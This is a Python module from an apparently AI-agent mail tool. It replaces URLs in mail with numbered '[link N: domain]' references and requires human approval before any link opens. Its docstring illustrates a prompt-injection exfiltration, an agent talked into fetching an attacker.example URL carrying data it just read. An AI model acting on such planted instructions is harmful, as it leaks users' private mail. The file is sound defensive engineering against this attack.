# GigaMail — mail for your AI agent
# Copyright (C) 2026 Adecubed
# Licensed under the GNU AGPL v3 or later. See LICENSE.
"""Links in mail reach the agent as text, domain and number, never as a URL.

A URL in a mail is an exit. An agent holding a shell or a fetch tool can be
talked into opening `https://attacker.example/?d=<what it just read>`, and
that request leaks the data whatever GigaMail's send gate says. So the agent
is never handed the address: every link, the ones behind an <a> and the ones
written out in the text or in an attachment, becomes `[link N: domain]`. To
open one, the agent calls open_link with N; GigaMail resolves N again from
the mail itself, shows the full URL to a person out of band, and opens it in
the person's browser only after they approve.

The numbering is a function of the text alone, so the same mail gives the
same N in read_message and in open_link without anything being stored.
"""
import re
from dataclasses import dataclass
from typing import Iterable, List, Optional, Sequence, Tuple
from urllib.parse import urlsplit

# A URL written out in text: a scheme, or a bare "www." host. Trailing
# punctuation that closes a sentence or a bracket is not part of it.
_URL_RE = re.compile(
    r"(?:\bhttps?://|\bwww\.)[^\s<>\"'`\[\]{}|\\^]+",
    re.IGNORECASE,
)
_TRAILING = ".,;:!?)»”’'\""

# A link text that itself looks like an address: compared with the real
# host, to flag "www.bank.example" written over a link to somewhere else.
_HOSTLIKE_RE = re.compile(r"^(?:https?://)?(?:www\.)?([a-z0-9-]+(?:\.[a-z0-9-]+)+)",
                          re.IGNORECASE)

OPENABLE_SCHEMES = ("http", "https")


@dataclass(frozen=True)
class LinkRef:
    n: int
    text: str
    url: str
    domain: str

    def for_agent(self) -> dict:
        out = {"n": self.n, "text": self.text, "domain": self.domain}
        if text_points_elsewhere(self.text, self.domain):
            out["text_points_elsewhere"] = True
        return out


def domain_of(url: str) -> str:
    """The host a URL leads to, lowercase, as the browser would contact it
    (punycode stays punycode: a look-alike host shows as xn--...)."""
    u = url.strip()
    if u.lower().startswith("www."):
        u = "http://" + u
    try:
        host = urlsplit(u).hostname or ""
    except ValueError:
        host = ""
    return host.lower().rstrip(".")


def normalize_url(url: str) -> str:
    """The URL as it would be opened: a bare "www." host gets http://."""
    u = url.strip()
    return "http://" + u if u.lower().startswith("www.") else u


def is_openable(url: str) -> bool:
    try:
        parts = urlsplit(normalize_url(url))
    except ValueError:
        return False
    return parts.scheme.lower() in OPENABLE_SCHEMES and bool(parts.hostname)


def text_points_elsewhere(text: str, domain: str) -> bool:
    """True when the link text names a host and it is not the real one."""
    m = _HOSTLIKE_RE.match((text or "").strip())
    if not m or not domain:
        return False
    shown = m.group(1).lower()
    shown = shown[4:] if shown.startswith("www.") else shown
    real = domain[4:] if domain.startswith("www.") else domain
    return not (real == shown or real.endswith("." + shown))


def _urls_in(text: str) -> List[Tuple[int, int, str]]:
    out = []
    for m in _URL_RE.finditer(text or ""):
        url = m.group(0).rstrip(_TRAILING)
        if url and domain_of(url):
            out.append((m.start(), m.start() + len(url), url))
    return out


def _label(text: str) -> str:
    """A link text with any address in it cut down to its host: a link
    written as its own URL must not hand the URL over through its text."""
    def host(m):
        url = m.group(0).rstrip(_TRAILING)
        return domain_of(url) + m.group(0)[len(url):]
    return _URL_RE.sub(host, text or "")


def number_links(text: str,
                 anchors: Sequence[Tuple[str, str]] = ()) -> List[LinkRef]:
    """Every openable link of a text, numbered from 1: first the anchors
    (in document order), then the URLs written out in the text that are
    not already among them. mailto: and other schemes are not numbered:
    there is nothing to fetch."""
    refs: List[LinkRef] = []
    seen = set()
    for label, url in anchors:
        if not is_openable(url) or url in seen:
            continue
        seen.add(url)
        refs.append(LinkRef(len(refs) + 1, _label(label), url, domain_of(url)))
    for _s, _e, url in _urls_in(text):
        if url in seen:
            continue
        seen.add(url)
        refs.append(LinkRef(len(refs) + 1, "", url, domain_of(url)))
    return refs


def redact(text: str, refs: Iterable[LinkRef]) -> str:
    """The text with every written-out URL replaced by `[link N: domain]`.
    URLs not in refs (should not happen) become `[link: domain]`."""
    by_url = {r.url: r for r in refs}
    pieces, last = [], 0
    for start, end, url in _urls_in(text):
        pieces.append(text[last:start])
        r = by_url.get(url)
        pieces.append(f"[link {r.n}: {r.domain}]" if r else f"[link: {domain_of(url)}]")
        last = end
    pieces.append(text[last:])
    return "".join(pieces)


def redact_plain(text: str) -> str:
    """For previews and search snippets: URLs become `[link: domain]`,
    without numbers (the full mail, through read_message, has them)."""
    return redact(text, ())


def find(refs: Sequence[LinkRef], n: int) -> Optional[LinkRef]:
    for r in refs:
        if r.n == n:
            return r
    return None
